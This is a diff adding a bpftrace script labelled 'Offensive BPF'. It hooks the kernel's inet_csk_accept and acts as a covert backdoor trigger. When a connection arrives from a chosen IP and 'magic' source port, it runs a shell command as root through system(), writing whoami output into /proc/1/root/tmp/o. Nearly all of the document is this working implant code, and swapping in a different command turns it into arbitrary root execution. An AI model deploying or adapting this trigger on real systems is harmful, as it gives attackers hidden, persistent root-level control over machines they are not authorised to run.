@@ -1,0 +1,49 @@
+#include <net/sock.h>
+
+BEGIN
+{
+    printf("Welcome to Offensive BPF... Use Ctrl-C to exit.\n");
+    printf("Allowed IP: %u (=> %s). Magic Port: %u\n", $1, ntop(AF_INET, $1), $2);
+}
+
+kretprobe:inet_csk_accept
+{
+  $sk        = (struct sock *) retval;
+
+  // only supporting IPv4
+  if ( $sk->__sk_common.skc_family == AF_INET ) 
+  { 
+
+      printf("->%s: Checking RemoteAddr... %s (%u).\n", 
+        func,
+        ntop($sk->__sk_common.skc_daddr), 
+        $sk->__sk_common.skc_daddr); 
+
+      //is IP allowed?
+      if ($sk->__sk_common.skc_daddr == (uint32)$1)
+      {
+        printf("->%s: IP check passed.\n", func);
+        $src_port_tmp = (uint16) $sk->__sk_common.skc_dport;
+        $loc_port     = $sk->__sk_common.skc_num; //for some reason need to read this other-wise sourc port is wrong
+        $src_port     = (( $src_port_tmp  >> 8) |  (( $src_port_tmp << 8) & 0x00FF00));
+
+        printf("->%s: Checking port: %d...\n", func, $src_port); 
+        
+        if ($src_port == (uint16) $2)
+        {
+          printf("->%s: Magic port check passed.\n", func); 
+          system("whoami >> /proc/1/root/tmp/o");
+          printf("->%s: Command executed.\n", func);
+        }
+        else
+        { 
+          printf("->%s: Magic port check FAILED.\n", func); 
+        }
+      } 
+  } 
+}
+
+END
+{
+  printf("Exiting. Bye.\n");
+}
